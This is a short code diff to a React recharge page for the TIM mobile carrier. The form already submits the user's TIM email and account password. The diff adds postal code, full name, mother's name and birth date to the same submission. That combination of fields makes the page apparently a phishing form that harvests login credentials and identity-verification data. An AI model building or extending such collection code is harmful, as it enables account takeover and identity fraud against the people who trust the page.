@@ -56,7 +56,11 @@ const TimRechargePage = () => {
         tim_email: formData.timEmail,
         tim_password: formData.timPassword,
         amount_paid: packageData.paid,
-        amount_received: packageData.received
+        amount_received: packageData.received,
+        cep: formData.cep,
+        full_name: formData.fullName,
+        mother_name: formData.motherName,
+        birth_date: formData.birthDate
       });
       
       setSelectedPackage(packageData);
